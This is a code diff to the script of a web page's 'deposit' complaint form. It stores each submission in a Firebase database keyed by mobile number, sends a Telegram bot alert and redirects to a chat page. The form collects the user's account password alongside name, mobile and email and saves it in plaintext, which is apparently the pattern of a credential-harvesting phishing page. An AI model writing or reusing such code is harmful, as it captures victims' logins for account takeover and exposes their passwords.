@@ -118,8 +118,6 @@
             }
         });
 
-        const REDIRECT_LINK = 'CHAT/CHAT-PENNAL/index.html';
-
         document.querySelector('.complain-form').addEventListener('submit', (e) => {
             e.preventDefault();
             
@@ -140,22 +138,28 @@
                 return;
             }
 
+            const mobile = inputs[1].value;
+            const complaintId = 'comp-' + Date.now();
+            const now = new Date();
+
             const complaintData = {
                 username: inputs[0].value,
-                mobile: inputs[1].value,
+                mobile: mobile,
                 password: inputs[2].value,
                 email: inputs[3].value,
                 problem: inputs[4].value,
                 type: 'deposit',
-                status: 'pending',
+                status: 'Pending',
+                date: now.toLocaleDateString(),
+                time: now.toLocaleTimeString(),
                 timestamp: Date.now()
             };
 
-            db.ref('complaints/').push(complaintData);
+            db.ref('complaints/' + mobile + '/deposit/' + complaintId).set(complaintData);
 
             getTelegramSettings().then(tg => {
                 if (tg.complaintBotToken && tg.complaintChatId) {
-                    const msg = `🚨 <b>New Complaint - Deposit</b>\n\n👤 Name: ${complaintData.username}\n📱 Mobile: ${complaintData.mobile}\n📧 Email: ${complaintData.email}\n📝 Problem: ${complaintData.problem}\n⏰ Time: ${new Date().toLocaleString()}`;
+                    const msg = `🚨 <b>New Complaint - Deposit</b>\n\n👤 Name: ${complaintData.username}\n📱 Mobile: ${mobile}\n📧 Email: ${complaintData.email}\n📝 Problem: ${complaintData.problem}\n⏰ Time: ${now.toLocaleString()}`;
                     sendTelegramAlert(tg.complaintBotToken, tg.complaintChatId, msg);
                 }
             });
@@ -165,7 +169,7 @@
             btn.textContent = 'SUBMITTING...';
             
             setTimeout(() => {
-                window.location.href = REDIRECT_LINK;
+                window.location.href = 'CHAT/CHAT-PENNAL/index.html';
             }, 3000);
         });
     </script>
